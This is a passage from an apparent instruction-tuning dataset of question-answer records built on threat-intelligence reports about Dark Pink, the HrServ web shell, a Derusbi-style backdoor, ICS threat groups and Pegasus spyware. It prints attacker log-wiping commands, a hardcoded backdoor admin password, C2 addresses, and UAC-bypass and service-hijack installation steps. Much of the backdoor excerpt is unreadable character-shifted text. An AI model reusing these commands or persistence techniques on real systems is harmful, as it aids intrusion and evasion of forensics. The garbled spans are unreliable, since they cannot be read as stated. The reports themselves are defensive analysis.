    "instruction": "Big Headline: Key findings\nDark Pink launched seven successful attacks against high-profile targets between June and December 2022.\nDark Pink's first activity, which we tie to a Github account leveraged by the threat actors, was recorded in mid-2021, and the first attack attributable to this APT group took place in June 2022. Their activity peaked in the final three months of 2022 when they launched four confirmed attacks.\nDark Pink's victims are located in five APAC countries (Vietnam, Malaysia, Indonesia, Cambodia, Philippines) and one European country (Bosnia and Herzegovina).\nVictims included military bodies, government and development agencies, religious organizations, and a non-profit organization.\nOne unsuccessful attack was launched against a European state development agency based in Vietnam in October 2022.\nDark Pink APT's primary goals are to conduct corporate espionage, steal documents, capture the sound from the microphones of infected devices, and exfiltrate data from messengers.\nDark Pink's core initial vector was targeted spear-phishing emails that saw the threat actors pose as job applicants. There was evidence to suggest that the threat actors behind Dark Pink scanned online job vacancy portals and crafted unique emails to victims that were advertising vacancies.\nAlmost all the tools leveraged by the threat actors were custom and self-made, including TelePowerBot and KamiKakaBot, along with the Cucky and Ctealer stealers. During our investigation, we noticed only one public tool: PowerSploit/Get-MicrophoneAudio.\nMedium Headline: Dark Pink APT utilized a rarely seen technique, termed Event Triggered\nExecution: Change Default File Association, to ensure launch of malicious TelePowerBot malware. Another technique leveraged by these particular threat actors was DLL Side-Loading, which they used to avoid detection during initial access.\nThe threat actors created a set of PowerShell scripts to carry out communication between victim and threat actors' infrastructure, facilitate lateral movement and network reconnaissance.\nAll communication between infected infrastructure and the threat actors behind Dark Pink is based on Telegram API.\nBig Headline: Dark Pink takes on all comers\nThe attacks carried out by this particular APT group have been advanced in every sense of the word. They have utilized a sophisticated mixture of custom tools to breach the defenses of multiple government and military organizations. The first attack Group-IB analysts were able to attribute to this APT group was registered on a religious organization in Vietnam in June 2022. However, they appear to have been active well before that, as Group-IB researchers identified a Github account used by these threat actors which showed activity dating back to mid-2021. According to our research, the malware initialized by the threat actors can issue commands for an infected machine to download modules from this particular Github account. Interestingly, the threat actors appeared to use only one Github account for the entire duration of the campaign to date, which could suggest that they have been able to operate without detection for a significant period of time.\nFollowing the June 2022 attack, Group-IB researchers were unable to attribute any other malicious activity to Dark Pink. However, this APT group burst into life towards the end of the summer, when Group-IB noticed an attack on a Vietnamese non-profit organization in August 2022 bearing all the hallmarks of the June attack. From then, Group-IB was able to attribute one attack in September, two attacks (one successful, one unsuccessful) in October, two in November, and one in December. Most recently, Group-IB discovered that Dark Pink was able to breach an Indonesian governmental organization on December 8, 2022.\nBig Headline: Kill Chain\nThe sophistication of the Dark Pink campaign is evidenced by its multiple distinct kill chains. The threat actors behind this wave of attacks were able to craft their tools in several programming languages, giving them flexibility as they attempted to breach defense infrastructure and gain persistence on victims' networks. As a result, we will discuss the different steps and stages of these processes, but it is important to note that the bulk of the attacks were based on PowerShell scripts or commands that aimed to launch communication between the infected networks and the threat actors' infrastructure.\nInitial access was achieved by successful spear-phishing emails. These messages contained a shortened link directing the victim to download a malicious ISO image, which in one case seen by Group-IB, was stored on the public, free-to-use sharing service MediaFire. Once the ISO image was downloaded by the victims, Group-IB identified three distinct infection chains, which we will detail below.\nThe first thing that caught our attention was that all communication between the devices of the threat actors and the victims was based on Telegram API. The custom modules created by the threat actors, TelePowerBot and KamiKakaBot, are designed to read and execute\ncommands via a threat actor-controlled Telegram bot. Interestingly, these modules were developed in different programming languages. TelePowerBot is represented as PowerShell script, while KamiKakaBot, which includes stealer functionalities, is developed on .NET. The threat actors have used the same Telegram bots for a long period of time, as one has been used since September 2021.\nAdditionally, Dark Pink APT utilizes the self-made stealers Ctealer and Cucky to steal victim credentials from web browsers. We will look at each of the above mentioned tools later in this report. At this stage, we will turn to detailing each step of the infection chain.\nBig Headline: Initial access\nA large part of the success of Dark Pink was down to the spear-phishing emails used to gain initial access. In one such attack, Group-IB was able to find the original email sent by the threat actors. In this one instance, the threat actor posed as a job applicant applying for the position of PR and Communications intern. In the email, the threat actor mentions that they found the vacancy on a jobseeker site, which could suggest that the threat actors scan job boards and use this information to create highly relevant phishing emails.\nThe emails contain a shortened URL linking to a free-to-use file sharing site, where the victim is presented with the option to download an ISO image that contains all the files needed for the threat actors to infect the victim's network. During our investigation into Dark Pink, we discovered that the threat actors leveraged several different ISO images, and we also noted that the documents contained in these ISO images varied from case to case. According to the information available to us, we strongly believe that the Dark Pink threat actors craft a unique email to each victim, and we do not discount that the threat actors can send the malicious ISO image as a direct attachment to the victim via email.\nThe ISO images sent in the spear-phishing emails contained varying numbers of files. However, there are three types of file found in all of the ISO images sent by the threat actors: a signed executable file, a nonmalicious decoy document (e.g. .doc, .pdf, or .jpg), and a malicious DLL file. Given that the email relates to a job opening, one can assume that the victim will first look for the supposed applicant's resume, which is often sent as a MS Word document. However, In Dark Pink attacks, the threat actors include an .exe file in the ISO image that mimics a MS Word file. The file contains \".doc\" in the file name and contains the MS Word icon as a means of confusing the victim and thinking that the file is safe to open.\nShould the victim execute the .exe file first, the malicious DLL file, located in the same folder as the .exe file, will run automatically. This is a technique used by threat actors known as (<https://attack.mitre.org/techniques/T1574/002/>)DLL Side-Loading. The primary function of the DLL execution is to ensure that the threat actors' core malware, TelePowerBot, gains persistence. Before the completion of the file execution, the decoy document (e.g. a letter, resume), is shown on the victim's screen.\nBig Headline: Trojan execution and persistence\nOne of the most interesting discoveries for Group-IB researchers was the process of how TelePowerBot or KamiKakaBot are launched on the victim's machine. As mentioned previously, the malicious DLL file that contains one of these two pieces of malware can be located inside the ISO image that is sent during spear-phishing campaigns. In one case analyzed by Group-IB, the threat actors used a chain of MS Office documents and leveraged (<https://attack.mitre.org/techniques/T1221/>)Template Injection, whereby the threat actors insert into the initial document a link to a template document that contains a malicious macro code. In two other cases examined by Group-IB researchers, the threat actors behind Dark Pink launched their malware by the DLL Side-Loading technique. In total, we found three different kill chains leveraged by the threat actors, and we will detail them below.\nRead the text above and answer this question: What was the primary goal of Dark Pink APT's attacks, and what specific actions did they take to achieve these objectives?",
    "output": "The primary goals of Dark Pink APT's attacks were to conduct corporate espionage, steal documents, capture sound from the microphones of infected devices, and exfiltrate data from messengers. To achieve these objectives, the threat actors utilized custom tools such as TelePowerBot and KamiKakaBot, along with the Cucky and Ctealer stealers. They also leveraged the Telegram API for communication between infected infrastructure and their own, ensuring a secure and efficient method of data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: HrServ web shell\nFile type\nPE32+ executable (DLL) (console) x86-64, for MS Windows\nCompiler Microsoft Visual C/C++(2015 v.14.0)\nThe sequence of operations starts with the registration of a service handler. HrServ then initiates an HTTP server utilizing the HTTP server API for its functionality. It calls the HttpAddUrlToGroup function to register the following URL so that matching requests are routed to the request queue.\n1 http://+:80/FC4B97EB-2965-4A3B-8BAD-B8172DE25520/\nClient-server communication uses custom encoding techniques that include Base64 encoding and FNV1A64 hashing algorithms.\nBased on the type and information within an HTTP request, specific functions are activated. These functions are distinguished by the GET parameter named cp. In addition, the DLL file utilizes the value of the NID cookie for various purposes. The use of the GET parameter pattern and the cookie value is consistent with practices employed by Google. We suspect that this intentional similarity in naming conventions is intended to disguise these requests in network traffic, making it more challenging to detect such malicious activity.\nAn example of such a request would be:\n1 &cp=1&client=desktop-gws-wiz-on-focus-serp&xssi=t&hl=en-TW&authuser=0&pq=\nMedium Headline: Code execution\nIf the cp value in the request is 6, this indicates a code execution process.\nInitially, it extracts the value of the NID cookie and applies its custom decoding technique\nIt writes this decoded value to the specified registry path, denoted as \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\IdentityStore\\RemoteFile\"\nThe custom-decoded POST data is then copied to the memory, after which a new thread is created and the process enters a sleep state.\nIn a particular observed scenario, the cp value is unknown. A multifunctional implant is activated in the system memory. The implant creates a file in the directory \"%temp%\", retrieves information from the registry, performs some actions based on this information, and records the output of these actions in the created file. As a result, the registry and the temporary file are used as a communication channel between the implant and HrServ.\nAvailable commands of the memory implant\nBased on our telemetry data, after successfully establishing a foothold and placing the memory implant in the system memory, the next actions are to erase the previously existing traces by deleting the scheduled \"MicrosoftsUpdate\" job and both the initial DLL and batch files:\n1 schtasks /delete /tn MicrosoftsUpdate /f\n2 cmd /c \"del /f/s/q $public\\hrserv.dll & del /f/s/q $public\\JKNLA.bat\"\nMedium Headline: Older variants\nWe have also discovered earlier, differently named variants of HrServ. These DLL files date back to early 2021. They also use the custom encoding algorithm and behave the same way after a file read error. However, there are subtle differences.\nThe web shell URL of these older variants differs from the current one:\n1 https://+:443/owa/MSExchangeService.svc\nThese samples exhibit a distinct behavior by creating a process and retrieving its output through a pipe, as opposed to allocating a memory section and creating a thread from it.\nBig Headline: Attribution\nThe TTPs analyzed in this investigation are not associated with any known threat actors we are tracking, but there are a few things that we observed:\nthe GET parameters used in the hrserv.dll file, which is used to mimic Google services, include \"hl\". This (<https://developers.google.com/custom-search/docs/xml_results?hl=en#WebSearch_Query_Parameter_Definitions>)specifies the host language of the user interface. Although this parameter has no functionality within the attack vector, the assigned value \"en-TW\" specifies that the Google search interface should be displayed in English, but the search results should be displayed in Traditional Chinese:\n1 &cp=1&client=desktop-gws-wiz-on-focus-serp&xssi=t&hl=en-TW&authuser=0&pq=\nthe samples include help strings for specific conditions, in English. We saw multiple typos that suggest the actor behind the samples is not a native English speaker.\nAn error message with a typo\nBig Headline: Conclusion\nThe analyzed sample represents a capable web shell. Based on the compile timestamps, its origins date back to at least 2021. This sophisticated malware variant exhibits the ability to initiate in-memory executions. In the observed scenario, communication is established through registry manipulations and temporary files.\nNotably, the web shell and memory implant use different strings for specific conditions. In addition, the memory implant features a meticulously crafted help message. Considering these factors, the malware's characteristics are more consistent with financially motivated malicious activity. However, its operational methodology exhibits similarities with APT behavior. Despite the malware's prolonged activity over several years, multiple instances involving these samples have not been documented. Our efforts are ongoing as we continue to monitor related activity, with the goal of unraveling the mystery in future investigations.\nQ: How do the older variants of HrServ differ from the current version in terms of web shell URL and behavior, and what implications do these differences have on the detection and mitigation strategies?",
    "output": "Older variants of HrServ, dating back to early 2021, use a different web shell URL: 'https://+:443/owa/MSExchangeService.svc', compared to the current URL. These older variants also exhibit distinct behavior by creating a process and retrieving its output through a pipe, instead of allocating a memory section and creating a thread from it. Understanding these differences is crucial for detection and mitigation strategies, as it allows security experts to tailor their defenses to recognize and respond to both current and past versions of the malware, ensuring comprehensive protection against evolving threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Initial C2 Phone Home Beacon\n7KH\ue003&\ue015\ue003ORFDWLRQ\ue003LQ\ue003WKLV\ue003VDPSOH\ue003LV\ue003VWDWLFDOO\\\ue003GH\u00bfQHG\ue003DV\ue003\ue014\ue011\ue01c\ue011\ue018\ue011\ue016\ue01b\ue01d\ue017\ue017\ue016\ue003\ue00b0DOD\\VLD\ue01d\ue0037PQHW\ue00f\ue0037HOHNRP\ue0030DOD\\VLD\ue003 %KG\ue00c\ue011\ue003:KLOH\ue003WKHUH\ue003LV\ue003\u00b5GHDG\ue003FRGH\u00b6\ue003WKDW\ue003ZLOO\ue003GRZQORDG\ue003WKH\ue003&\ue015\ue003ORFDWLRQ\ue003IURP\ue003DQ\ue003+773\ue00385/\ue003WKDW\ue003FRXOG\ue003EH\ue003GH\u00bfQHG\ue003 in the binary, using the User-Agent string \"Google\", this code is not activated due to the format of the statLFDOO\\\ue003GH\u00bfQHG\ue003&\ue015\ue003ORFDWLRQ\ue003XVLQJ\ue003DQ\ue003,3\ue003DGGUHVV\ue011\ue0037KXV\ue003WKH\ue003VDPSOH\ue003ZLOO\ue003RQO\\\ue003DWWHPSW\ue003WR\ue003FRQQHFW\ue003GLUHFWO\\\ue003XVLQJ\ue003 a raw socket to the C2 located at 1.9.5.38:443. This indicates the use of a 'boiler plate code' or a builder software package that automates the creation of the malicious sample.\nThe malicious sample sends an initial beacon to the C2 that includes the following information:\n\"\ue003\ue0037KH\ue003FRPSXWHU\ue003QDPH\ue003DV\ue003REWDLQHG\ue003ZLWK\ue003WKH\ue003*HW&RPSXWHU1DPH\ue00b\ue00c\ue003$3,\n\"\ue003\ue0037KH\ue003XVHUQDPH\ue003RI\ue003WKH\ue003FXUUHQW\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQ\ue003LI\ue003FXUUHQWO\\\ue003EHLQJ\ue003H[HFXWHG\ue003LQ\ue003D\ue0035HPRWH\ue003    Desktop session or \"none\" otherwise.\n\"\ue003\ue0037KH\ue003FXUUHQWO\\\ue003ORJJHG\ue003LQ\ue003XVHUQDPH\ue003LQ\ue003WKH\ue003V\\VWHP\ue003DV\ue003REWDLQHG\ue003ZLWK\ue003WKH\ue003*HW8VHU1DPH\ue00b\ue00c\ue003$3,\n\"\ue003\ue0037KH\ue003PDFKLQH\u00b6V\ue003XSWLPH\n\"\ue003\ue0037KH\ue003:LQGRZV\ue003YHUVLRQ\ue003DQG\ue0036HUYLFH\ue0033DFN\ue003OHYHO\n\"\ue003\ue0037KH\ue003DPRXQW\ue003RI\ue003DYDLODEOH\ue0033K\\VLFDO\ue0030HPRU\\\ue003LQ\ue0030%\n\"\ue003\ue003&XUUHQW\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQV\ue003DV\ue003HQXPHUDWHG\ue003ZLWK\ue003:76(QXPHUDWH6HVVLRQV\n\"\ue003\ue003$\ue003VWULQJ\ue003LGHQWL\u00bfHU\ue003VWDWLFDOO\\\ue003VHW\ue003WR\ue003\u00b3)%,\ue015\ue013\ue014\ue014\ue014\ue013\ue015\ue017\u00b4\n7KH\ue003EHDFRQ\ue003LV\ue003HQFU\\SWHG\ue003XVLQJ\ue003DQ\ue003;25\ue012$''\ue003ORRS\ue003XVLQJ\ue003WKH\ue003VWDWLFDOO\\\ue003GH\u00bfQHG\ue003NH\\\ue003\ue013[\ue014&\ue003DQG\ue003VHQW\ue003WR\ue003WKH\ue003&\ue015\ue011\ue003\ue003\nThe following python function can be used to decode the beacon stings:\ndef decode(crypted): decoded=\"\"\nfor x in crypted:    decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)  return decoded\nWhen command 0x23000004 is received, a temporary new user \"_DomainUser_\" with password \"Dom4!nUserP4ss\" is created and added to the local Administrators group. The backdoor is then started under that account and the user is deleted. It would appear this technique is meant to obfuscate the activities of the malicious sample by masking the process creator's user name to appear to be a generic domain user. Note that such an account does not normally exist in an Active Directory environment.\nAdditionally, the primary C2 connection allows for requests to start additional connections to the C2 implementing the following functionality:\n\"\ue003\ue003$\ue003SURFHVV\ue003FRQWURO\ue003FRQQHFWLRQ\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue018\ue013\ue013\ue013\ue013\ue013\ue013\ue003WKDW\ue003DOORZV\ue003IRU\ue003HQXPHUDWLRQ\ue003DQG\ue003\ue003    killing of running processes\n\"\ue003\ue003$\ue003SLSHG\ue003FRPPDQG\ue003OLQH\ue003SURFHVV\ue003FRQQHFWLRQ\ue003WKDW\ue003DOORZV\ue003FRPPXQLFDWLRQ\ue003ZLWK\ue003VWDQGDUG\ue003LQSXW\ue003DQG    output of arbitrary executables; initiated by command 0x23000000\n\"\ue003\ue003$\ue003\u00bfOH\ue003EURZVHU\ue003FRQQHFWLRQ\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue014\ue013\ue013\ue013\ue013\ue013\ue013\ue003WKDW\ue003DOORZV\ue003IRU\n|\ue003 /LVWLQJ\ue003GLUHFWRU\\\ue003FRQWHQWV\n|\ue003 &RS\\LQJ\ue00f\ue003GHOHWLQJ\ue003DQG\ue003PRYLQJ\ue003\u00bfOHV\n|\ue003 2SHQLQJ\ue003\u00bfOHV\ue003XVLQJ\ue003WKH\ue0036KHOO([HFXWH\ue00b\ue00c\ue003$3,\n|\ue003 'RZQORDGLQJ\ue003DQG\ue003XSORDGLQJ\ue003\u00bfOHV\ue003IURP\ue003\ue012\ue003WR\ue003WKH\ue003&\ue015\n\"\ue003\ue003$\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQ\ue003HQXPHUDWRU\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue014\ue013\ue014\ue013\ue013\ue013\ue013\nMedium Headline: Post Exploitation Tool Sample (MD5:  2dce7fc3f52a692d8a84a0c182519133)\nThis sample is typical of a post exploitation tool; it is written in .NET 2.0. This code appears to have been compiled on Thursday May 26th, 2011 at 10:21:44 A.M. UTC (early evening time in China). The backdoor functionality can be instantiated either directly from the command line or through commands issued over a network based protocol via the C2. If no arguments are given, a connection to the C2 is initiated to the statiFDOO\\\ue003GH\u00bfQHG\ue003,3\ue003DGGUHVV\ue011\ue003\ue0037KH\ue003FRPPDQG\ue003OLQH\ue003RSWLRQV\ue003VXSSRUW\ue003SRVW\ue003H[SORLWDWLRQ\ue003FDSDELOLWLHV\ue003VXFK\ue003DV\ue003FKDQJLQJ\ue003 \u00bfOH\ue003WLPHVWDPSV\ue00f\ue003IRUHQVLF\ue003PLWLJDWLRQ\ue00f\ue003SULYLOHJH\ue003HVFDODWLRQ\ue00f\ue003ODXQFKLQJ\ue003WKH\ue003H[HFXWDEOH\ue00f\ue003DQG\ue003VSHFLI\\LQJ\ue003D\ue003VSHFL\u00bfF\ue003 C2.\n2QH\ue003LQWHUHVWLQJ\ue003FRPPDQG\ue003OLQH\ue003RSWLRQ\ue003DOORZV\ue003WKH\ue003EDFNGRRU\ue003WR\ue003\u00bfOWHU\ue003WKH\ue003FRQWHQWV\ue003RI\ue003VSHFL\u00bfHG\ue003\u00bfOHV\ue003WR\ue003UHPRYH\ue003 FRQWHQW\ue003XVLQJ\ue003D\ue003UHJXODU\ue003H[SUHVVLRQ\ue003\ue00bUHJH[\ue00c\ue011\ue003\ue0037KLV\ue003FRPPDQG\ue003WKHQ\ue003PRGL\u00bfHV\ue003WKH\ue003FUHDWLRQ\ue00f\ue003PRGL\u00bfFDWLRQ\ue00f\ue003DQG\ue003ODVW\ue003 DFFHVV\ue003WLPHVWDPSV\ue003RI\ue003WKH\ue003PRGL\u00bfHG\ue003\u00bfOH\ue003WR\ue003FRQFHDO\ue003WKH\ue003FRQWHQW\ue003PRGL\u00bfFDWLRQV\ue011\ue003\ue003$\ue003GHWDLOHG\ue003OLVWLQJ\ue003RI\ue003FRPPDQG\ue003 line arguments can be viewed in Appendix A.  This activity is generally associated with log cleaning to com-plicate a forensic investigation.\nThe sample contains an embedded IP address for C2 that is stored in an encrypted format as a string resource:\nW\ue003 \ue003\u00b3\ue014\ue017P-T<K-.FK-X7PR6=N-.D\ue017\ue015&\ue01a\ue01b\ue01b\ue018\ue01c\ue01c\ue01a%\ue018\ue015\ue016)\ue019\ue016\ue018\ue019\ue019)\ue017\ue013\ue01a)\ue016\ue01b\ue016\ue017%&&\ue018\ue017$$$\ue016\ue015\ue018\ue015\ue017\u00b4\nVariants of this Trojan are sometimes detected under the name 'Derusbi' by Microsoft, Trend, Sophos and Symantec AV engines.\nThis sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide an interactive command line shell to the C2.  It also is able to bypass User Account Control (UAC) to install itself by using the 'sysprep.exe' Microsoft Windows executable provided by the targeted system. The steps it takes to install itself onto a system are as follows:\n1. Copies itself to to %WINDIR%\\system32\\Msres<3 random characters>.ttf\n\ue015\ue011\ue003\ue003$IWHU\ue003LW\ue003FRSLHV\ue003LWVHOI\ue00f\ue003LW\ue003ZLOO\ue003PRGLI\\\ue003WKH\ue003FUHDWLRQ\ue003WLPH\ue00f\ue003ODVW\ue003DFFHVV\ue003WLPH\ue003DQG\ue003ODVW\ue003PRGL\u00bfFDWLRQ\ue003WLPH\ue003WR     the current system time when the copy was made but with the year changed to 2005.\n\ue016\ue011\ue003\ue003$GGV\ue003LWVHOI\ue003DV\ue003D\ue003VHUYLFH\ue003QDPH\ue003IURP\ue003WKH\ue003EDFNGRRU\u00b6V\ue003FRQ\u00bfJXUDWLRQ\ue003XQGHU\ue003+.(<B/2&$/B     MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<service>\" This defaults to \"wuauserv\", \ue003\ue003\ue003\ue003\ue003WKH\ue003OHJLWLPDWH\ue003:LQGRZV\ue0038SGDWH\ue003VHUYLFH\ue00f\ue003LQ\ue003WKH\ue003JLYHQ\ue003ELQDU\\\u00b6V\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue011\n4.\nAdds itself to list of services started by 'netsvc' using the service name 'helpsvc'.\n5.\nIf McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules     the copy to be deleted on reboot using the well documented MoveFileExA API.\n6. It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to     the copy of itself it made in Step 1. The /u parameter means \"uninstall\", which calls      DllUnregisterServer, this is an unsophisticated method of DLL entry point obfuscation.\n7. DllUnregisterServer installs the driver and initiates the backdoor component.\n7KH\ue003VDPSOH\ue003LV\ue003FDSDEOH\ue003RI\ue003\u00b5GURSSLQJ\u00b6\ue003DQ\ue003HPEHGGHG\ue012HQFU\\SWHG\ue003NHUQHO\ue003GULYHU\ue011\ue003\ue003,I\ue003WKH\ue003SURFHVV\ue003\u00b3=KX'RQJ)DQJ<X\ue011 exe\" is running (AntiVirus360 program from the Chinese 'Quihoo 360 Technology Co., LTD' 360 ), or the username of the DLL's host process context is not 'SYSTEM', the driver is not written to disk.  Barring the two aforementioned conditions, the sample decrypts the kernel driver to:\n\"%sysdir%\\Drivers\\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys\"\n)ROORZLQJ\ue003WKH\ue003GHFU\\SWLRQ\ue003DQG\ue003ZULWLQJ\ue003RI\ue003WKH\ue003GULYHU\ue003WR\ue003GLVN\ue00f\ue003LW\ue003LV\ue003ORDGHG\ue003XVLQJ\ue003WKH\ue003=Z/RDG'ULYHU\ue00b\ue00c\ue003$3,\ue011\ue0037KH\ue003GULY-HU\ue003LV\ue003HQFU\\SWHG\ue003ZLWK\ue003D\ue003VLPSOH\ue003IRXU\ue003E\\WH\ue003;25\ue003NH\\\ue003YDOXH\ue003RI\ue003\ue013[\ue015(\ue01b\ue01b\ue018')\ue016\ue01e\ue003DIWHU\ue003GHFU\\SWLRQ\ue003WKH\ue003\u00bfOH\ue003KDV\ue003WKH\ue0030'\ue018\ue003 hash of dae6b9b3b8e39b08b10a51a6457444d8.\n7KH\ue003PDOZDUH\ue003FRQWDLQV\ue003D\ue003G\\QDPLF\ue003FRQ\u00bfJXUDWLRQ\ue003VWRUHG\ue003LQ\ue003WKH\ue0035HJLVWU\\\ue003XQGHU\n\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Rpc\\Security\"\nDQG\ue003ORDGV\ue003D\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue003HPEHGGHG\ue003LQWR\ue003WKH\ue003ELQDU\\\ue003LI\ue003VXFK\ue003D\ue003FRQ\u00bfJXUDWLRQ\ue003LV\ue003QRW\ue003IRXQG\ue011\ue0037KH\ue003ZD\\\ue003 WKLV\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue003LV\ue003ORDGHG\ue003DQG\ue003SDUVHG\ue003LQGLFDWHV\ue003WKDW\ue003WKLV\ue003PDOZDUH\ue003KDV\ue003EHHQ\ue003EXLOW\ue003ZLWK\ue003D\ue003\u00b5EXLOGHU\u00b6\ue003WKDW\ue003 WDNHV\ue003D\ue003WHPSODWH\ue003VDPSOH\ue003DQG\ue003OHWV\ue003DQ\ue003XQVRSKLVWLFDWHG\ue003XVHU\ue003VSHFLI\\\ue003D\ue003FRQ\u00bfJXUDWLRQ\ue003ZLWKRXW\ue003UHFRPSLOLQJ\ue003DQ\\\ue003 code.\n,I\ue003WKH\ue003FXUUHQW\ue003VHUYLFH\ue003QDPH\ue003PDWFKHV\ue003D\ue003VHW\ue003RI\ue003SUH\ue010GH\u00bfQHG\ue003VHUYLFH\ue003QDPHV\ue003WKDW\ue003OHJLWLPDWHO\\\ue003H[LVW\ue003LQ\ue003:LQGRZV\ue00f\ue003 the backdoor then loads the original service's DLL into the address space with LoadLibrary and invokes the ServiceMain export. This effectively hijacks the original service's entry while retaining its functionality.\nWhile there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default FRQ\u00bfJXUDWLRQ\ue003SUHVHQW\ue003VSHFL\u00bfHV\ue003\ue015\ue013\ue015\ue011\ue01b\ue019\ue011\ue014\ue01c\ue013\ue011\ue016\ue01d\ue01b\ue013\ue003DV\ue003D\ue003&\ue015\ue003WR\ue003XVH\ue00f\ue003WKLV\ue003LV\ue003WKH\ue003VDPH\ue003+RQJ\ue003.RQJ\ue003&\ue015\ue003VHUYHU\ue003DV\ue003 the one used by the post exploitation .NET tool.\n\nBased on the above text, answer a question. Describe the installation process of the DeepPanda malware's DLL component, including how it bypasses User Account Control (UAC) and installs itself as a service.",
    "output": "The DeepPanda malware's DLL component is installed through a series of steps. First, it copies itself to %WINDIR%\\\\system32\\\\Msres<3 random characters>.ttf and modifies the file's timestamp to appear as if it was created in 2005. It then registers itself as a service, typically using the name 'wuauserv', and adds itself to the list of services started by 'netsvc' using the service name 'helpsvc'. If McAfee AV is installed, it creates a copy of regsvr32.exe named Update.exe and schedules it for deletion on reboot. The malware then calls regsvr32.exe with specific parameters to unregister the DLL, which is an unsophisticated method of DLL entry point obfuscation. Finally, the DllUnregisterServer function installs the driver and initiates the backdoor component. The driver is decrypted and written to '%sysdir%\\\\Drivers\\\\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys' unless certain conditions are met, such as the presence of specific antivirus software or if the DLL's host process context is not 'SYSTEM'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: A SUMMARY\n2017 featured multiple, concerning developments within the ICS security space. On a general level, wormable ransomware such as WannaCry and NotPetya provided notice to ICS owners and operators that industrial networks are far more connected to the IT environment than many realized. While significant and \u2013 for some organizations \u2013 costly, 2017 also featured some targeted events led by activity groups focused exclusively on the ICS environment.\nPreviously, defenders perceived ICS threat actors as rare with significant technical limitations or hurdles to overcome. But 2017 demonstrated \u2013 either because ICS is an increasingly enticing target, or because researchers and defenders are merely 'looking harder' \u2013 that these groups are more common than previously thought. Toward that end, Dragos identified five active, ICS-focused groups that displayed various levels of activity throughout 2017. While only one has demonstrated an apparent capability to impact ICS networks through ICS-specific malware directly, all have engaged in at least reconnaissance and intelligence gathering surrounding the ICS environment.\nOverall, the scope and extent of malicious activity either directly targeting or gathering information on ICS networks increased significantly throughout 2017.\nAs a result of these events, Dragos has been able to analyze and develop strategies for defending and mitigating various types of attack against ICS assets\n\nHow did the activities of ICS-focused threat groups in 2017 challenge the previous perceptions of defenders regarding the capabilities and prevalence of these groups?",
    "output": "In 2017, the activities of ICS-focused threat groups challenged the previous perceptions of defenders in several ways. Initially, defenders believed that ICS threat actors were rare and faced significant technical limitations or hurdles. However, 2017 demonstrated that these groups are more common than previously thought, either due to ICS becoming an increasingly enticing target or because researchers and defenders were 'looking harder.' Dragos identified five active, ICS-focused groups that displayed various levels of activity throughout the year. While only one group demonstrated the capability to directly impact ICS networks using ICS-specific malware, all groups engaged in reconnaissance and intelligence gathering surrounding the ICS environment. This increase in malicious activity targeting or gathering information on ICS networks highlighted the need for improved defense and mitigation strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: 3.2. Device Infection\nAccording to the purported 2013 NSO Group Pegasus documentation found in the Hacking Team materials, NSO Group offers two remote installation vectors for spyware onto a target's device: a zero-click vector, and a one-click vector. The one-click vector involves sending the target a normal SMS text message with a link to a malicious website. The malicious website contains an exploit for the web browser on the target's device, and any other required exploits to implant the spyware. In the attack against Mansoor, the Trident exploit chain was used.\nTo use NSO Group's zero-click vector, an operator instead sends the same link via a special type of SMS message, like a (<https://www.silentservices.de/security-advisory-samsung-leaves-its-android-smartphones-with-wap-push-feature-open-to-attacks-one-sms-to-rule-them-all/>)WAP Push Service Loading (SL) message. A WAP Push SL message causes a phone to automatically open a link in a web browser instance, eliminating the need for a user to click on the link to become infected. Many newer models of phones have started ignoring or restricting WAP Push messages. Mobile network providers may also decide to block these messages.\nThe documentation refers to a malicious website employed in installation of the spyware (\"Agent\") as an Anonymizer, which communicates with a Pegasus Installation Server located on the operator's premises. When a target visits a malicious link from their device, the Anonymizer forwards the request to the Pegasus Installation Server, which examines the target device's (<https://en.wikipedia.org/wiki/User_agent>)User-Agent header to determine if Pegasus has an exploit chain, such as the Trident, that supports the device.\nIf the device is supported, the Pegasus Installation Server returns the appropriate exploit to the target device through the Anonymizer and attempts an infection. If infection fails for any reason, the target's web browser will redirect to a legitimate website specified by the Pegasus operator, in order to avoid arousing the target's suspicion.\nIn the operation targeting Mansoor, the one-click vector was used, with anonymizer sms.webadv.co (see Section 4: The Trident iOS Exploit Chain and Payload for more details).\nMedium Headline: 3.3. Data Collection\nAccording to the purported NSO Group documentation, once successfully implanted on a phone using an exploit chain like the Trident, Pegasus can actively record or passively gather a variety of different data about the device. By giving full access to the phone's files, messages, microphone and video camera, the operator is able to turn the device into a silent digital spy in the target's pocket.\nIn the spyware used in targeting Mansoor, we confirmed many elements of this functionality, and observed indications that the collection of the following types of data was supported, among others (see Section 4.2: The Payload for more details):\nCalls made by phone, WhatsApp and Viber,\nSMS messages, as well as messages and other data from popular apps like Gmail, WhatsApp, Skype, Facebook, KakaoTalk, Telegram, and others,\nA wide range of personal data, such as calendar data and contact lists, as well as passwords, including Wi-Fi passwords.\nMedium Headline: 3.4. Exfiltration\nAccording to the purported NSO Group documentation, an infected device transmits collected information back to a Pegasus Data Server at the operator's premises, via the PATN 